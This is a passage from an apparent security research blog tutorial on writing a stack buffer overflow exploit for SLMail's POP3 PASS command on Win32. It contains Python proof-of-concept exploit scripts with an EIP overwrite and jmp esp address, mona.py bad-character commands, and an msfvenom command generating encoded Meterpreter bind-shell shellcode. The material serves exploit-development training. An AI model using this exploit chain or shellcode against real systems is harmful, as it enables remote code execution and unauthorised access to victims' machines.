\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xF7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
)

buff_size = 6000
buffer ='A'*4654
buffer += 'BBBB'
buffer += bytearray
buffer += 'C'*(buff_size - len(buffer))
HOST = '127.0.0.1'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()
</code></pre>



<p>Note that we put the byte array just behind the four bytes that can control EIP (four “B”s in this POC), so the register ESP will be directly pointing to the byte array after the process crash.</p>



<p>Reload the process, attach it to the Immunity Debugger and launch the exploit.</p>



<p>Once the process has crashed, enter this command in Immunity:</p>



<pre class="wp-block-code"><code>!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154 (address contained on ESP)</code></pre>



<p>This command tells mona.py to compare the memory from the address given with the content of the bytearray.bin file (if no address is given, the compare function searches for the bytearray in all memory and performs the comparison).</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7728" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/3-5/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?fit=975%2C658&amp;ssl=1" data-orig-size="975,658" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?fit=300%2C202&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?fit=975%2C658&amp;ssl=1" loading="lazy" width="975" height="658" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=975%2C658&#038;ssl=1" alt class="wp-image-7728 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?w=975&amp;ssl=1 975w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=300%2C202&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=768%2C518&amp;ssl=1 768w" data-lazy-sizes="(max-width: 975px) 100vw, 975px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=975%2C658&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7728" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/3-5/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?fit=975%2C658&amp;ssl=1" data-orig-size="975,658" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?fit=300%2C202&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?fit=975%2C658&amp;ssl=1" loading="lazy" width="975" height="658" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=975%2C658&#038;ssl=1" alt="" class="wp-image-7728" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?w=975&amp;ssl=1 975w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=300%2C202&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/3.png?resize=768%2C518&amp;ssl=1 768w" sizes="(max-width: 975px) 100vw, 975px" data-recalc-dims="1" /></noscript></figure>



<p>There is corruption in the first byte. Create the byte array again excluding 0x00 and run the “compare” command again. To exclude 0x00 from the byte array use this command on mona.py:</p>



<pre class="wp-block-code"><code>!mona bytearray -cpb \x00 </code></pre>



<p>Update the exploit and execute it again with the process attached to the debugger Once the process crashes, execute the following command:</p>



<pre class="wp-block-code"><code>!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154</code></pre>



<p>Now we have to exclude 0x0a:</p>



<pre class="wp-block-code"><code>!mona bytearray -cpb \x00\x0a </code></pre>



<p>Update the exploit, attach the process to the debugger, run the exploit and then compare again:</p>



<pre class="wp-block-code"><code>!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7730" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/4-1-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?fit=612%2C163&amp;ssl=1" data-orig-size="612,163" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4-1" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?fit=300%2C80&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?fit=612%2C163&amp;ssl=1" loading="lazy" width="612" height="163" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?resize=612%2C163&#038;ssl=1" alt class="wp-image-7730 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?w=612&amp;ssl=1 612w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?resize=300%2C80&amp;ssl=1 300w" data-lazy-sizes="(max-width: 612px) 100vw, 612px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?resize=612%2C163&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7730" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/4-1-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?fit=612%2C163&amp;ssl=1" data-orig-size="612,163" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4-1" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?fit=300%2C80&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?fit=612%2C163&amp;ssl=1" loading="lazy" width="612" height="163" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?resize=612%2C163&#038;ssl=1" alt="" class="wp-image-7730" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?w=612&amp;ssl=1 612w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/4-1.png?resize=300%2C80&amp;ssl=1 300w" sizes="(max-width: 612px) 100vw, 612px" data-recalc-dims="1" /></noscript></figure></div>



<p>The next bad char is 0x0d. Repeat the process:</p>



<pre class="wp-block-code"><code>!mona bytearray -cpb \x00\x0a\x0d </code></pre>



<p>Update the exploit, attach the &nbsp;process to the debugger, run the exploit and then compare again:</p>



<pre class="wp-block-code"><code>!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154</code></pre>



<p>Here is the mona.py result:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7731" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/6-3/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?fit=630%2C184&amp;ssl=1" data-orig-size="630,184" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="6" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?fit=300%2C88&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?fit=630%2C184&amp;ssl=1" loading="lazy" width="630" height="184" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?resize=630%2C184&#038;ssl=1" alt class="wp-image-7731 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?w=630&amp;ssl=1 630w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?resize=300%2C88&amp;ssl=1 300w" data-lazy-sizes="(max-width: 630px) 100vw, 630px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?resize=630%2C184&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7731" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/6-3/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?fit=630%2C184&amp;ssl=1" data-orig-size="630,184" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="6" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?fit=300%2C88&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?fit=630%2C184&amp;ssl=1" loading="lazy" width="630" height="184" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?resize=630%2C184&#038;ssl=1" alt="" class="wp-image-7731" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?w=630&amp;ssl=1 630w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/6.png?resize=300%2C88&amp;ssl=1 300w" sizes="(max-width: 630px) 100vw, 630px" data-recalc-dims="1" /></noscript></figure></div>



<p>As can be seen, the comparison results window says “Unmodified”, which means the byte array in memory is equal to the content of the file bytearray.bin.</p>



<p>Now we know the bad characters affecting our exploit are 0x00 0x0a 0x0d. We just need to put together all the information we have in our proof-of-concept exploit:</p>



<pre class="wp-block-code"><code>import sys
import socket

# BadChars = \x00\x0a\x0d
shellcode=(\xcc\xcc\xcc\xcc) # 0xcc is a breakpoint to stop execution.
 
eip = '\xd8\xfc\x91\x7c' #0x7c91fcd8 : jmp esp &#91;ntdll.dll] (on Little endian)
buff_size = 6000
buffer ='A'*4654
buffer += eip
buffer += shellcode
buffer += 'C'*(buff_size - len(buffer))
HOST = '127.0.0.1'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()
</code></pre>



<p>In this version of the exploit we use the byte 0xcc that is the opcode of a breakpoint instruction as shellcode. That means that once the exploit is launched our process will stop on 0xcc.</p>



<p>For EIP we use an address extracted from the file c:\logs\slmail\jmp.txt. Remember that x86 architecture stores the values in memory using Little Endian, which means the memory address would have to be reversed&nbsp; byte by byte (for example 0x7c91fcd8 has to be converted to \xd8\xfc\x91\x7c).</p>



<p>Note: be careful with bad characters when you pick up the jmp esp instruction.</p>



<p>Now, attach the process to Immunity Debugger again, set a breakpoint to the address 0x7c91fcd8 (jmp esp) run the process and execute the exploit:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7733" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/7-3/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?fit=701%2C238&amp;ssl=1" data-orig-size="701,238" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="7" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?fit=300%2C102&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?fit=701%2C238&amp;ssl=1" loading="lazy" width="701" height="238" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?resize=701%2C238&#038;ssl=1" alt class="wp-image-7733 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?w=701&amp;ssl=1 701w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?resize=300%2C102&amp;ssl=1 300w" data-lazy-sizes="(max-width: 701px) 100vw, 701px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?resize=701%2C238&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7733" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/7-3/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?fit=701%2C238&amp;ssl=1" data-orig-size="701,238" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="7" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?fit=300%2C102&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?fit=701%2C238&amp;ssl=1" loading="lazy" width="701" height="238" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?resize=701%2C238&#038;ssl=1" alt="" class="wp-image-7733" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?w=701&amp;ssl=1 701w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/7.png?resize=300%2C102&amp;ssl=1 300w" sizes="(max-width: 701px) 100vw, 701px" data-recalc-dims="1" /></noscript></figure></div>



<p>Once the flow stops on the breakpoint we set on jmp esp, move step-by-step in the debugger using the F7 key. Once you press F7, you can check that the next instruction to execute is a CC (the first byte of our shellcode).</p>



<p>That means we are controlling the execution flow.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7734" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/8-3/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?fit=1046%2C704&amp;ssl=1" data-orig-size="1046,704" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="8" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?fit=300%2C202&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?fit=1024%2C689&amp;ssl=1" loading="lazy" width="1024" height="689" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=1024%2C689&#038;ssl=1" alt class="wp-image-7734 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=1024%2C689&amp;ssl=1 1024w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=300%2C202&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=768%2C517&amp;ssl=1 768w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?w=1046&amp;ssl=1 1046w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=1024%2C689&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7734" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/8-3/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?fit=1046%2C704&amp;ssl=1" data-orig-size="1046,704" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="8" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?fit=300%2C202&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?fit=1024%2C689&amp;ssl=1" loading="lazy" width="1024" height="689" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=1024%2C689&#038;ssl=1" alt="" class="wp-image-7734" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=1024%2C689&amp;ssl=1 1024w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=300%2C202&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?resize=768%2C517&amp;ssl=1 768w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/8.png?w=1046&amp;ssl=1 1046w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" /></noscript></figure>



<p>Now we need to replace the current shellcode with a real one, maybe a Meterpreter bind tcp generated with Metasploit.</p>



<p><em>Avoid using bind shells in real-world exploits because anyone with the appropriate network access could connect to them and gain unauthorised access to the victim machine. For training conditions bind shells are fine. In the real world it is much safer to launch a reverse shell to a computer under our control.</em></p>



<p>Note that when you generate a Metasploit shellcode encoded to avoid certain bad characters, within the payload itself is a routine in charge to decode the payload. That routine uses the stack to push and pop values, so we need to move ESP to a location above the shellcode injected in memory (remember we were putting the shellcode just where ESP was pointing).</p>



<p>First, we use Kali Linux with Metasploit to generate the shellcode. The command to generate the shellcode is:</p>



<pre class="wp-block-code"><code>msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.65.176 -e x86/shikata_ga_nai -b ‘\x00\x0a\x0d’ -f c</code></pre>



<p>This shellcode will bind TCP port 4444 (default port on Metasploit that can be changed with the LPORT option) on the interface with the IP address 192.168.65.176 to connect a Meterpreter session:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7735" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/a/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?fit=1173%2C542&amp;ssl=1" data-orig-size="1173,542" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="a" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?fit=300%2C139&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?fit=1024%2C473&amp;ssl=1" loading="lazy" width="1024" height="473" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1024%2C473&#038;ssl=1" alt class="wp-image-7735 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1024%2C473&amp;ssl=1 1024w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=300%2C139&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=768%2C355&amp;ssl=1 768w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1100%2C508&amp;ssl=1 1100w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?w=1173&amp;ssl=1 1173w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1024%2C473&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7735" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/a/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?fit=1173%2C542&amp;ssl=1" data-orig-size="1173,542" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="a" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?fit=300%2C139&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?fit=1024%2C473&amp;ssl=1" loading="lazy" width="1024" height="473" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1024%2C473&#038;ssl=1" alt="" class="wp-image-7735" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1024%2C473&amp;ssl=1 1024w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=300%2C139&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=768%2C355&amp;ssl=1 768w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?resize=1100%2C508&amp;ssl=1 1100w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/a.png?w=1173&amp;ssl=1 1173w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" /></noscript></figure>



<p>Then, to ensure ESP is not pointing to the shellcode when the decoder routine is executed, we add an instruction to decrement ESP (sub esp 240h). To obtain the opcodes that represent the instruction, we use a tool from the Metasploit Framework, metasm_shell.rb.</p>



<p>In the following screenshot we see the use of metasm_shell.rb to generate the opcodes we need:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7736" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/b/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?fit=630%2C223&amp;ssl=1" data-orig-size="630,223" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="b" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?fit=300%2C106&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?fit=630%2C223&amp;ssl=1" loading="lazy" width="630" height="223" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?resize=630%2C223&#038;ssl=1" alt 